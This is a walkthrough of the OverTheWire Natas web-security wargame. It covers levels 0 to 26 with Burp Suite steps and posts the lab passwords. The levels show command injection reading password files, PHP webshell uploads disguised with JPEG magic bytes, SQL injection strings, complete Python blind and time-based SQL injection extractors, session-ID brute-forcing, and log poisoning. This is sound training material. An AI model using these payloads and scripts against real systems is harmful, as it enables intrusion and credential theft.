# OverTheWire: Natas Walkthrough Notes

# Level 0 

> Level Information
- **URL**: `http://natas0.natas.labs.overthewire.org`
- **Username**: `natas0`
- **Password**: `natas0`
- **Goal**: Find the password for natas1


> Solution Steps

![image](images/image0.png)

![image](images/image-0.png)

![image](images/image--0.png)


1. Open browser and navigate to the URL above
2. Enter credentials when prompted:
   - Username: natas0
   - Password: natas0

>Step 2: Initial Observation
The page displays: *"You can find the password for the next level on this page."  

>Step 3: View Page Source

**Method A - Direct Browser (Easiest)** 
- **Right-click** anywhere on the page and select **"View Page Source"**
- OR use keyboard shortcut: `Ctrl + U` (Windows/Linux) or `Cmd + U` (Mac)

**Method B - Using Burp Suite** 
1. Configure Burp Suite as a proxy 
2. Ensure **"Intercept is on"** 
3. *Right-click* anywhere in the     intercepted request
   - Select *"Send to Repeater"* from the context menu
4. Click on **Repeater** tab (next to Proxy tab)
   - You'll see the captured request waiting there  

5. In Repeater, click the **"Send"** button
   - The response appears in the right panel   


# Level 0 - 1

> Level Information
- **URL**: `http://natas1.natas.labs.overthewire.org`
- **Username**: `natas1`
- **Password**: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
Goal: Find the password for natas2

> Solution Steps

Method  - Using Burp Suite (Your Workflow)

Step 1: Capture Request in Proxy**
![Burp Proxy - Intercepting the request]
*Configure Burp with intercept ON and capture the login request*

**Step 2: Send to Repeater**
![Right-click menu - Send to Repeater]
*Right-click on the intercepted request and select "Send to Repeater"*

**Step 3: Request in Repeater**
![Repeater tab - Request ready]
*Request successfully transferred to Repeater tab*

**Step 4: Send and View Response**
![Repeater response - Password found]
*Click "Send" and find the password in the HTML comment*

![image](images/image1.png)

# Level 1 - 2

> Level Information
- **URL**: `http://natas2.natas.labs.overthewire.org`
Username: natas2
Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
Goal: Find the password for natas3

> Solution Steps

1. Capture Request in Proxy

2. Send to Repeater

3. Analyze Response in Repeater
   
   ![image](images/image--2.png)

4. Investigate the /files Directory
  -http://natas2.natas.labs.overthewire.org/files/

   ![image](images/image2.png)

  -http://natas2.natas.labs.overthewire.org/files/users.txt
   
   ![image](images/image-2.png)

# Level 2 - 3

> Level Information
- **URL**: `http://natas3.natas.labs.overthewire.org`
- **Username**: `natas3`
- **Password**: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
- **Goal**: Find the password for natas4

1. Capture Request in Proxy

2. Send to Repeater

3. Analyze Response in Repeater

   ![image](images/image/3.png)

4. Investigate robots.txt
   -http://natas3.natas.labs.overthewire.org/robots.txt

   ![image](images/image3.png)

   -http://natas3.natas.labs.overthewire.org/s3cr3t/

   ![image](images/image-3.png)

   -http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt

   ![image](images/image--3.png)

# Level 3 - 4  

> Level Information
- **URL**: `http://natas4.natas.labs.overthewire.org`
- **Username**: `natas4`
- **Password**: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
- **Goal**: Find the password for natas5

1. Capture Request in Proxy

2. Send to Repeater

3. Analyze Response in Repeater

   ![image](images/image4.png)

4. Modify the Referer Header  //place of nats4 paste natas5 in referrer//

  Referer: http://natas5.natas.labs.overthewire.org/

   ![image](images/image-4.png)

# Level 4 - 5

> Level Information
- **URL**: `http://natas5.natas.labs.overthewire.org`
- **Username**: `natas5`
- **Password**: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
- **Goal**: Find the password for natas6

1. Capture Request in Proxy

2. Send to Repeater

3. Analyze Response in Repeater

    -  Examine Cookies in Request
    In Repeater, look at the request headers. You'll see:

    ![image](images/image5.png)

4.  Modify the Cookie Value 
     - Change loggedin to 1

     ![image](images/image-5.png)  


# Level 5 - 6

> Level Information
- **URL**: `http://natas6.natas.labs.overthewire.org`
- **Username**: `natas6`
- **Password**: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
- **Goal**: Find the password for natas7

1. Initial Observation
    - View Source Code

2. Capture Request in Proxy

3. Send to Repeater

4. Analyze Response in Repeater

    ![image](images/image6.png)

5. Locate the Secret File
     - The secret is stored in /includes/secret.inc. In Repeater, modify the request to:
    
    GET /includes/secret.inc HTTP/1.1
    Host: natas6.natas.labs.overthewire.org
     
    ![image](images/image--6.png)

    - The response shows: <? $secret = "FOEIUWGHFEEUHOFUOIU"; ?>

6. Submit the Secret

    - Go back to the main page

    - Enter the secret: FOEIUWGHFEEUHOFUOIU

    -Submit the form   

    ![image](images/image!6.png)

# Level 6 - 7

> Level Information
- **URL**: `http://natas7.natas.labs.overthewire.org`
- **Username**: `natas7`
- **Password**: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS 
- **Goal**: Find the password for natas8


> Solution Steps

1. Initial Observation
The page has two links: "Home" and "About". Notice the URL pattern when clicking: index.php?page=home and index.php?page=about .

2. Capture Request in Proxy

3. Send to Repeater

4. Analyze Response in Repeater

    ![image](images/image7.png)

5. Modify the page Parameter

    ![image](images/image-7.png)


# Level 7 - 8

> Level Information
- **URL**: `http://natas8.natas.labs.overthewire.org`
- **Username**: `natas8`
- **Password**: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
- **Goal**: Find the password for natas9

> Solution Steps

1. Initial Observation

     -"Input secret:" form and a "View sourcecode" link

2.  View Source Code
     -The code shows that whatever secret you submit goes through three encoding steps :

    base64_encode() - Converts to base64

    strrev() - Reverses the string

    bin2hex() - Converts to hexadecimal

To find the original secret, you need to reverse the process 

after reversal the secret is 
     - Type or paste: oubWYf2kBq in Input secret

![image](images/image8.png)


# Level 8 - 9

> Level Information
- **URL**: `http://natas9.natas.labs.overthewire.org`
- **Username**: `natas9`
- **Password**: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t 
- **Goal**: Find the password for natas10

> Solution Steps

1. Initial Observation

    -Find the Search Form

    - In the input field, type a simple word like test 

Click the "Search" button

You'll see results appear below - these are words from dictionary.txt that contain "test" 

  ![image](images/image--9.png)

2. Command Injection in Burp Suite

   Capture Request in Proxy  

   Send to Repeater

   Analyze Response in Repeater

   ![image](images/image9.png)

3.  Modify for Command Injection / Request
    
    -GET /index.php?needle=;cat%20/etc/natas_webpass/natas10%20%23&submit=Search HTTP/1.1
Host: natas9.natas.labs.overthewire.org
Authorization: Basic bmF0YXM5OlpFMWNrODJsbWRHSW9FcmxoUWdXTkQ2ajJXeno2YjZ0
Connection: close


![image](images/image-9.png)


# Level 9 - 10

> Level Information
- **URL**: `http://natas10.natas.labs.overthewire.org`
- **Username**: `natas10`
- **Password**: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
- **Goal**: Find the password for natas11

> Solution Steps

1. Initial Observation

2. View Source Code
    - In the input field, type a simple word like test 

    ![image](images/image10.png)
3. Capture the request in Burp Proxy

4. Send to Repeater

5. Analyze Response in Repeater

    ![image](images/image-10.png)

6.  Modify with Bypass Payload

     - GET /?needle=.%20/etc/natas_webpass/natas11%20%23&submit=Search HTTP/1.1

      Host: natas10.natas.labs.overthewire.org

      Authorization: Basic bmF0YXMxMDp0N0k1Vkh2cGExNHNKVFVHVjBjYkVzYllmRlAyZG1PdQ==

      Connection: close

      ![image](images/image--10.png)

# Level 10 - 11

> Level Information
- **URL**: `http://natas11.natas.labs.overthewire.org`
- **Username**: `natas11`
- **Password**: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
- **Goal**: Find the password for natas12

> Solution Steps

1. Initial Observation

2. Press ctrl+shift+i

3. Click Cookies → http://natas11.natas.labs.overthewire.org

  ![image](images/image11.png)

4. Find the cookie named data and copy its Value

  HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D

5. Clean the Cookie for CyberChef

    HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=

6.   Use CyberChef to Find the XOR Key  
     
     From Base64	Default

     XOR	Key: {"showpassword":"no","bgcolor":"#ffffff"}
      Key format: UTF8

![image](images/image-11.png)

7. Create New Cookie with "showpassword=yes"

   XOR	Key: eDWo (your key from Step 3)
   Key format: UTF8

   To Base64	Default

   Input:

text
{"showpassword":"yes","bgcolor":"#ffffff"}

   ![image](images/image--11.png)

8. Step 5: Replace Cookie in Browser
Go back to Firefox → Developer Tools (F12) → Storage tab

Find the data cookie

Double-click the Value field

Delete the old value

Paste your new cookie value

Press Enter to save

![image](images/image11.png)

![image](images/image-!11.png)


# Level 11 - 12

> Level Information
- **URL**: `http://natas12.natas.labs.overthewire.org`
- **Username**: `natas12`
- **Password**: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
- **Goal**: Find the password for natas13

> Solution Steps

1. Initial Observation

2. Create a PHP Webshell

3. Open a text editor (Notepad, VS Code, etc.)

4. Copy the PHP code and paste it into the text editor

 -<?php
  echo file_get_contents("/etc/natas_webpass/natas13");
?>

!![image](images/image12.png)

5. Set Up Burp Suite

6. Capture the request in Burp Proxy

7. Send to Repeater

8. Analyze Response in Repeater

![image](images/image-12.png)

9. Modify the Hidden Filename
   - pf2kkeelmb.jpg --> shell.php

![image](images/image--12.png)   

10. Access Your Uploaded File

    -http://natas12.natas.labs.overthewire.org/upload/lm0ulnvirb.php

![image](images/image-!12.png)


# Level 12 - 13

> Level Information
- **URL**: `http://natas13.natas.labs.overthewire.org`
- **Username**: `natas13`
- **Password**: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
- **Goal**: Find the password for natas14

> Solution Steps

1. Initial Observation

2. Create a PHP Webshell with JPEG Magic Bytes

!![image](images/image13.png)

 echo -n -e '\xFF\xD8\xFF\xE0' > magic.hex
 cat magic.hex > shell.php
echo '<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' >> shell.php
hexdump -C shell.php | head -n 1
file shell.php

3. Set Up Burp Suite

4. Upload the File Through Firefox

5. Capture the request in Burp Proxy

6. Send to Repeater

7. Analyze Response in Repeater

![image](images/image-13.png)

8. Modify the Hidden Filename

 m3yrfw5agp.jpg --> shell.php

![image](images/image--13.png)

9. Access Your Uploaded File

 -http://natas13.natas.labs.overthewire.org/upload/i647qurbxh.php

![image](images/image-!13.png)


# Level 13 - 14

> Level Information
- **URL**: `http://natas14.natas.labs.overthewire.org`
- **Username**: `natas14`
- **Password**: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
- **Goal**: Find the password for natas15

> Solution Steps

1. Initial Observation

2. Test the Injection

3. Add ?debug=1 to the current URL in your browser's address bar:
   -http://natas14.natas.labs.overthewire.org/index.php?debug=1

    Now enter in the form:

    Username: admin

    Password: admin

![image](images/image14.png)

4. Capture the request in Burp Proxy

5. Send to Repeater

6. Analyze Response in Repeater

![image](images/image-14.png)

7. Craft the SQL Injection
    
    In the login form, enter:

Username: " OR 1=1 #

Password: anything

![image](images/image--14.png)

![image](images/image-!14.png)


# Level 14 - 15

> Level Information
- **URL**: `http://natas15.natas.labs.overthewire.org`
- **Username**: `natas15`
- **Password**: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

- **Goal**: Find the password for natas16

> Solution Steps

1. Initial Observation

2. Understand the Blind SQL Injection

     Craft the SQL Injection Payload
     !![image](images/image--15.png)

3. Manual Testing with Burp Suite

4. Capture the request in Burp Proxy

5. Send to Repeater

6. Analyze Response in Repeater

![image](images/image15.png)

![image](images/image-15.png)

7. Automate with Python Script (What We Used)
   The Script We Used
   #!/usr/bin/env python3
import requests
import string
import time
from requests.auth import HTTPBasicAuth

 ===== CONFIGURATION =====
username = 'natas15'
password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'  # Your password
url = 'http://natas15.natas.labs.overthewire.org/index.php'

 Characters to test (a-z, A-Z, 0-9)
chars = string.ascii_letters + string.digits
found = ""

print("=" * 60)
print("NATAS 15 → 16 BLIND SQL INJECTION")
print("=" * 60)

 Test connection first
test = requests.post(url, auth=HTTPBasicAuth(username, password),
                     data={'username': 'natas16'}, timeout=10)
if "This user exists" in test.text:
    print("[✓] User 'natas16' exists, ready to start\n")

 Extract password character by character
for position in range(32):
    for c in chars:
        payload = f'natas16" AND password LIKE BINARY "{found}{c}%" #'
        
        try:
            r = requests.post(url, auth=HTTPBasicAuth(username, password),
                             data={'username': payload}, timeout=5)
            
            if "This user exists" in r.text:
                found += c
                print(f"[✓] Position {position+1:2d}: {c} → {found}")
                break
            
            # Progress indicator
            if (chars.index(c) + 1) % 10 == 0:
                print(".", end="", flush=True)
                
        except requests.exceptions.Timeout:
            print("T", end="", flush=True)  # Timeout indicator
            time.sleep(2)
            continue
        except Exception as e:
            print("!", end="", flush=True)  # Error indicator
            time.sleep(1)
            continue
    
    print()  # New line after each position
    time.sleep(0.5)  # Small delay between positions

print("\n" + "=" * 60)
print(f"🎉 Password for natas16: {found}")
print("=" * 60)

   - Run this code
      nano natas15-solver.py

      python3 natas15-solver.py

![image](images/image-!15.png)

![image](images/image--!15.png)

![image](images/image---!15.png)

# Level 15 - 16

> Level Information
- **URL**: `http://natas16.natas.labs.overthewire.org`
- **Username**: `natas16`
- **Password**: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
- **Goal**: Find the password for natas17

> Solution Steps

1. Initial Observation

2. View Source Code

3.  Automated Python Solution
       Create the Script - nano natas16_solver.py

       Run the Script - python3 natas16_solver.py

![image](images/image16.png)

![image](images/image-16.png)

![image](images/image--16.png)

       #!/usr/bin/env python3
import requests
import string
import time
from requests.auth import HTTPBasicAuth

 ===== YOUR CREDENTIALS =====
username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
url = 'http://natas16.natas.labs.overthewire.org/index.php'
 =============================

print("=" * 60)
print("NATAS 16 → 17 PASSWORD EXTRACTOR")
print("=" * 60)

 Step 1: Verify 'British' exists (it does)
print("[*] Verifying test word 'British'...")
test = requests.post(url, auth=HTTPBasicAuth(username, password),
                     data={'needle': 'British', 'submit': 'Search'})
if 'British' in test.text:
    print("  ✓ 'British' found in dictionary\n")
else:
    print("  ✗ Test word failed. Exiting.")
    exit(1)

Step 2: Find which characters are in the password
all_chars = string.ascii_letters + string.digits
valid_chars = ""

print("[*] Step 1: Finding valid characters (this takes ~2 minutes)...")

for c in all_chars:
    payload = f"$(grep {c} /etc/natas_webpass/natas17)British"
    
    try:
        r = requests.post(url, auth=HTTPBasicAuth(username, password),
                          data={'needle': payload, 'submit': 'Search'},
                          timeout=10)
        
        if 'British' not in r.text:
            valid_chars += c
            print(f"  ✓ Found: '{c}' -> {valid_chars}")
        
    except requests.exceptions.Timeout:
        print(f"  ⏳ Timeout on '{c}', skipping...")
        time.sleep(2)
        continue
    except Exception as e:
        print(f"  ⚠️ Error on '{c}': {e}")
        continue
    
    time.sleep(0.3)

print(f"\n✅ Valid characters found: {valid_chars}")
print(f"   Total: {len(valid_chars)} characters\n")

 Step 3: Extract password in correct order
print("[*] Step 2: Extracting password order (this takes ~5 minutes)...")
found_password = ""

for position in range(32):
    for c in valid_chars:
        payload = f"$(grep ^{found_password}{c} /etc/natas_webpass/natas17)British"
        
        try:
            r = requests.post(url, auth=HTTPBasicAuth(username, password),
                              data={'needle': payload, 'submit': 'Search'},
                              timeout=10)
            
            if 'British' not in r.text:
                found_password += c
                print(f"  Position {position+1:2d}: '{c}' -> {found_password}")
                break
                
        except requests.exceptions.Timeout:
            print(f"  ⏳ Timeout on '{found_password}{c}', retrying...")
            time.sleep(2)
            continue
        except Exception as e:
            print(f"  ⚠️ Error: {e}")
            continue
    
    time.sleep(0.5)

print("\n" + "=" * 60)
print(f"🎉 PASSWORD FOR NATAS17: {found_password}")
print("=" * 60)

4. Understanding the script

    - Finding Characters
    - Interpreting results
    - Building the password 
    - Output

    ![image](images/image-!16.png)

    ![image](images/image-!!16.png)

# Level 17 - 18

> Level Information
- **URL**: `http://natas17.natas.labs.overthewire.org`
- **Username**: `natas17`
- **Password**: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
- **Goal**: Find the password for natas18

> Solution Steps

1. Initial Observation
    -Understand the challenge 

2. The Solution: Time-Based Blind SQL Injection

3. The Python Automation Script

    - nano natas17_solver.py

4. The Complete Working Script
![image](images/image17.png)

     import requests
from string import digits, ascii_lowercase, ascii_uppercase

username = 'natas17'
password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'

url = 'http://natas17.natas.labs.overthewire.org/index.php'
characters = ascii_lowercase + ascii_uppercase + digits

def try_password(prefix):
    injection = f'natas18" AND password LIKE BINARY "{prefix}%" AND SLEEP(5) -- '
    response = requests.get(url, auth=(username, password), params={"username": injection}, timeout=10)
    return response.elapsed.total_seconds() > 5

def find_password():
    found_password = ''
    while True:
        found_any = False
        for char in characters:
            test_password = found_password + char
            print(f'Trying: {test_password}')
            if try_password(test_password):
                found_password += char
                print(f'Found: {found_password}')
                found_any = True
                break
        if not found_any:
            break
    return found_password

password_natas18 = find_password()
print(f'Password for natas18: {password_natas18}')

5. Running the Script
    -python3 natas17_solver.py

![image](images/image-17.png)    

# Level 18 - 19

> Level Information
- **URL**: `http://natas18.natas.labs.overthewire.org`
- **Username**: `natas18`
- **Password**: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
- **Goal**: Find the password for natas19

> Solution Steps

1. Initial Observation

2. Understand the Challenge
   - view source code

3. Understanding the Attack

4. Python Automation Script

![image](images/image18.png)

    import requests

username = 'natas18'
password = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'

url = 'http://natas18.natas.labs.overthewire.org/index.php'

def trySessionID(session_id):
  cookies = {'PHPSESSID': str(session_id)}
  response = requests.get(url, auth=(username, password), cookies=cookies)
  if "You are an admin" in response.text:
    return True, response.text
  return False, None

for session_id in range(1, 641):
  print(f'Trying PHPSESSID={session_id}')
  success, result = trySessionID(session_id)
  if success:
    print(f'Success! PHPSESSID={session_id}')
    print(result)
    break
  else:
    print('No valid session ID found.')

 ![image](images/image-18.png)


 # Level 19 - 20

> Level Information
- **URL**: `http://natas19.natas.labs.overthewire.org` 
- **Username**: `natas19`
- **Password**: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
- **Goal**: Find the password for natas20   

> Solution Steps

1. Initial Observation

2. Understand the Challenge

3. Key Observations 
Login with username test and any password

Open Developer Tools (F12) → Storage tab (Firefox) or Application tab (Chrome)

Look at the PHPSESSID cookie value - it's a hex string like 3334342d74657374

Decode it using CyberChef or Python: 3334342d74657374

![image](images/image19.png)

![image](images/image-19.png)

4. Python Automation Script

   import requests

username = 'natas19'
password = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'
url = 'http://natas19.natas.labs.overthewire.org/index.php'

def trySessionID(session_id):
  session_string = f'{session_id}-admin'
  hex_session_id = session_string.encode('utf-8').hex()
  cookies = {'PHPSESSID': hex_session_id}
  response = requests.get(url, auth=(username, password), cookies=cookies)
  if "You are an admin" in response.text:
      return True, response.text
  return False, None

for session_id in range(1, 641):
  print(f'Trying PHPSESSID={session_id}-admin (HEX: {session_id}-admin)')
  success, resutlt = trySessionID(session_id)
  if success:
    print(f'Success! PHPSESSID={session_id}-admin')
    print(resutlt)
    break
  else:
    print('No valid session ID found.')

![image](images/image--19.png)

![image](images/image-!19.png)

# Level 20 - 21

> Level Information
- **URL**: `http://natas20.natas.labs.overthewire.org`
- **Username**: `natas20`
- **Password**: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
- **Goal**: Find the password for natas21

> Solution Steps

1. Initial Observation

2. Understand the Challenge

3. Capture the POST Request

    -In Firefox, you'll see a form with "Your name:" field

    -Enter any name (e.g., admin) and click "Change name"

    ![image](images/image20.png)

4. Modify the Request with Payload   

    ![image](images/image-20.png)

    ![image](images/image--20.png)

5.  Forward the Request
    Click "Forward" in Burp Proxy

    After forwarding turn off the intercept 

    The response will appear in the browser   

    ![image](images/image-!20.png)


# Level 21 - 22

> Level Information
- **URL**: `http://natas21.natas.labs.overthewire.org`
- **Username**: `natas21`
- **Password**: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
- **Goal**: Find the password for natas22

> Solution Steps

1. Initial Observation

2. Understand the challenge 

3. Go to the Experimenter Site
    -You'll see a form with CSS styling options
    -click on the link after that it will open page like this 
    ![image](images/image21.png)

4. Set up burpsuite intercept
    - Capture the image21 POST Request
    ![image](images/image-21.png)

5.  Modify the Request - Add admin=1   
     -align=center&fontsize=100%25&bgcolor=yellow&submit=Update&admin=1

    ![image](images/image--21.png)

6.  Get the Session ID (PHPSESSID)
      -ctrl+shift+i
      -Look at the response headers (in Burp Proxy or HTTP History)
      -Copy this PHPSESSID value - this is your session token

      ![image](images/image---21.png)

7.   Replace Cookie in Main Site
      ![image](images/image-!21.png) 

      After replace 

      ![image](images/image-!!21.png)  

# Level 22 - 23

> Level Information

- **URL**: `http://natas22.natas.labs.overthewire.org`
- **Username**: `natas22`
- **Password**: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
- **Goal**: Find the password for natas23

> Solution Steps

1. Initial Observation

2. Understand the challenge

3. Open Linux Terminal

4. Run the cURL Command
    -curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz "http://natas22.natas.labs.overthewire.org/?revelio"

    ![image](images/image22.png)

# Level 23 - 24

> Level Information

- **URL**: `http://natas23.natas.labs.overthewire.org`
- **Username**: `natas23`
- **Password**: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
- **Goal**: Find the password for natas24

> Solution Steps

1. Initial Observation

2. Understand the challenge

3. Given what we’ve just learned, we know that our password needs to 1) start with a value higher than 10 and 2) include “iloveyou”.

I chose the password 100iloveyou:

http://natas23.natas.labs.overthewire.org/?passwd=100iloveyou

![image](images/image23.png)


# Level 24 - 25

> Level Information

- **URL**: `http://natas24.natas.labs.overthewire.org`
- **Username**: `natas24`
- **Password**: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
- **Goal**: Find the password for natas25

> Solution Steps

1. Initial Observation

2. Understand the challenge

3. Submit this request with passwd as an array (by adding in []), passwd will be equal to NULL, which is equal to 0. This will pass the strcmp() comparison:

http://natas24.natas.labs.overthewire.org/?passwd[]=test

![image](images/image24.png)


# Level 25 - 26

> Level Information

- **URL**: `http://natas25.natas.labs.overthewire.org`
- **Username**: `natas25`
- **Password**: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
- **Goal**: Find the password for natas26

> Solution Steps

1. Initial Observation

2. Understand the challenge

3. Use ....// to bypass the directory traversal check and view the log file that corresponds to your PHPSESSID.
4. Use Burp Suite to modify this request and set the HTTP user agent header to valid PHP code that prints up the flag.

5. Before sending to burpsuite must click on language en in opetions then send to burp suite

6. . Send the request, which will inject your command into the log file, then show you the updated log file.

![image](images/image25.png)

--it will also shows in firefox 

!![image](images/image-25.png)

# Level 26 - 27

> Level Information

- **URL**: `http://natas26.natas.labs.overthewire.org`
- **Username**: `natas26`
- **Password**: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
- **Goal**: Find the password for natas27

> Solution Steps

1. Initial Observation